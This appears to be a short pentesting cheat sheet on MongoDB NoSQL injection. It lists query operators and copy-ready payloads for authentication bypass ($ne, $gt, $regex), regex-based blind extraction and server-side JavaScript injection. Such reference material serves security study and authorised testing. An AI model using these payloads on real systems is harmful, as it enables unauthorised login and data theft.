#web #nosqli #mongodb #injection

# NoSQL Injection (MongoDB)

Related: [sqli](sqli.md) · [auth-attacks](auth-attacks.md) · [secure-coding-js](../CodeReview/secure-coding-js.md)

## Contents
- [MongoDB Shell](#mongodb-shell)
- [Key Operators](#key-operators)
- [Authentication Bypass (URL-encoded)](#authentication-bypass-url-encoded)
- [Authentication Bypass (JSON)](#authentication-bypass-json)
- [Blind Extraction](#blind-extraction)
- [Server-Side JavaScript Injection](#server-side-javascript-injection)

## MongoDB Shell
```bash
mongosh mongodb://127.0.0.1:27017
```
Connect to MongoDB (then `show databases`, `show collections`).

```javascript
db.collection.find({...})
```
Query documents (`findOne` for one). Use `insertOne` / `updateOne` / `remove` to modify.

## Key Operators
```javascript
{ type: {$ne: "x"} }
```
Comparison operators:

| Operator | Meaning |
|---|---|
| `$ne` | not equal |
| `$gt` | greater than |
| `$gte` | greater than or equal |
| `$lt` | less than |
| `$lte` | less than or equal |
| `$in` | value in array |
| `$nin` | value not in array |

```javascript
{ type: {$regex: /^G.*/} }
```
`$regex` matches a pattern; `$where` runs a JS expression.

## Authentication Bypass (URL-encoded)
```
param[$ne]=x
```
Bypass via not-equal.

```
param[$gt]=
```
Bypass via greater-than empty string (also `$gte=`, `$regex=.*`).

## Authentication Bypass (JSON)
```json
{"param": {"$ne": "x"}}
```
Not-equal bypass.

```json
{"param": {"$gt": ""}}
```
Greater-than-empty bypass (also `$gte`, `$regex: ".*"`, `$nin: []`).

## Blind Extraction
```
param[$regex]=^XYZ.*$
```
Infer a value character-by-character via regex.

```json
{"param": {"$regex": "^XYZ.*$"}}
```
JSON form of regex-based blind extraction.

## Server-Side JavaScript Injection
```javascript
' || true || ''=='
```
SSJI payload to force a true condition (also `" || true || ""=="`).
